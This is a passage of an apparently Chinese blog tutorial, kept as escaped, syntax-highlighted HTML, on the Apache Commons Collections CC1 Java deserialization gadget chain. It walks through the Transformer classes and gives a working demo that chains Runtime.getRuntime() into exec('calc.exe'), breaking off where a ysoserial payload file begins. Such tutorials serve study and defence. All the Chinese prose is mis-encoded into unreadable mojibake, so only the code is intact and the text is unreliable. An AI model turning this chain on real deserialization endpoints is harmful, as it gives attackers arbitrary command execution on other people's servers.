&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="å‰ç½®">å‰ç½®&lt;/h3>
&lt;p>é¦–å…ˆç†è§£ä¸€ä¸‹æ²¡è§è¿‡çš„å‡ ä¸ªå‡½æ•°&lt;/p>
&lt;ul>
&lt;li>&lt;code>Transformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>ä¸€ä¸ªæŽ¥å£ï¼Œåªæœ‰ä¸€ä¸ªå¾…å®žçŽ°çš„transformæ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Transformer&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>TransformedMap&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>TransformedMapå¯¹innerMapä½œäº†ä¿®é¥°ï¼Œä¼ å‡ºçš„outerMapæ˜¯ä¿®é¥°åŽçš„M&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">KeyTransformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">valueTransformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>keyTransformeræ˜¯å¤„ç†æ–°å…ƒç´ keyçš„å›žè°ƒï¼ŒvalueTransformeræ˜¯å¤„ç†æ–°å…ƒç´ valueçš„å›žè°ƒï¼›è¿™é‡Œçš„å›žè°ƒå¹¶ä¸æ˜¯å›žè°ƒå‡½æ•° è€Œæ˜¯ä¸€ä¸ªå®žçŽ°äº†ä¸Šé¢TransformeræŽ¥å£çš„ç±»&lt;/p>
&lt;ul>
&lt;li>&lt;code>ConstantTransformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">constantToReturn&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iConstant&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">constantToReturn&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">iConstant&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ˜¯ä¸€ä¸ªå®žçŽ°äº†TransformeræŽ¥å£çš„ç±»ï¼Œå®ƒçš„è¿‡ç¨‹ç±»ä¼¼æž„é€ å‡½æ•°æ—¶ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨transformæ–¹æ³•ä¸­å°†è¿™ä¸ªå¯¹è±¡è¿”å›žï¼Œä½œç”¨æ˜¯åŒ…è£…ä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨æ‰§è¡Œå›žè°ƒæ—¶è¿”å›žè¿™ä¸ªå¯¹è±¡ï¼Œæ–¹ä¾¿åŽç»­æ“ä½œ&lt;/p>
&lt;ul>
&lt;li>&lt;code>InvokerTransformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>ä¹Ÿæ˜¯ä¸€ä¸ªå®žçŽ°äº†TransformeræŽ¥å£çš„ç±»ï¼Œç±»å¯ä»¥ç”¨æ¥æ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯ååºåˆ—åŒ–èƒ½RCEçš„å…³é”®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">methodName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">paramTypes&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">methodName&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iParamTypes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">paramTypes&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iArgs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¾…æ‰§è¡Œçš„æ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–¹æ³•çš„å‚æ•°ç±»åž‹ï¼Œç¬¬ä¸‰ä¸ªæ˜¯ä¼ å…¥çš„å‚æ•°&lt;/p>
&lt;p>ä¹‹åŽçš„å›žè°ƒtransformæ–¹æ³•æ‰§è¡Œinputå¯¹è±¡çš„iMethodNameæ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">iMethodName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">iParamTypes&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">iArgs&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchMethodException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FunctorException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; does not exist&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IllegalAccessException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FunctorException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; cannot be accessed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationTargetException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FunctorException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; threw an exception&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>ChainedTransformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>ä¹Ÿæ˜¯ä¸€ä¸ªå®žçŽ°äº†TransformeræŽ¥å£çš„ç±»ï¼Œä½œç”¨æ˜¯å°†å†…éƒ¨å¤šä¸ªTransformerä¸²åœ¨ä¸€èµ·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">object&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">iTransformers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">object&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">iTransformers&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">].&lt;/span>&lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">object&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‰ä¸€ä¸ªå›žè°ƒè¿”å›žçš„ç»“æžœå¯ä»¥ä½œä¸ºåŽä¸€ä¸ªå›žè°ƒçš„å‚æ•°ä¼ å…¥&lt;/p>
&lt;h3 id="demo">demo&lt;/h3>
&lt;p>ç„¶åŽå†æ¥çœ‹demo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">()),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªChainedTransformerï¼ŒåŒ…å«ConstantTransformerï¼ˆå¾—åˆ°Runtimeå¯¹è±¡ï¼‰å’ŒInvokerTransformerï¼ˆæ‰§è¡Œä»£ç éƒ¨åˆ†ï¼‰ï¼Œè¿™ä¸ªChainedTransformeråªæ˜¯ä½œä¸ºå›žè°ƒéƒ¨åˆ†ï¼Œæˆ‘ä»¬ç”¨TransformedMap.decorateå¯¹å®ƒè¿›è¡ŒåŒ…è£…ï¼Œæœ€åŽé€šè¿‡&lt;code>outerMap.put&lt;/code> å‘Mapä¸­æ”¾å…¥æ–°å…ƒç´ è§¦å‘å›žè°ƒï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤&lt;/p>
&lt;h3 id="transformedmap">TransformedMap&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
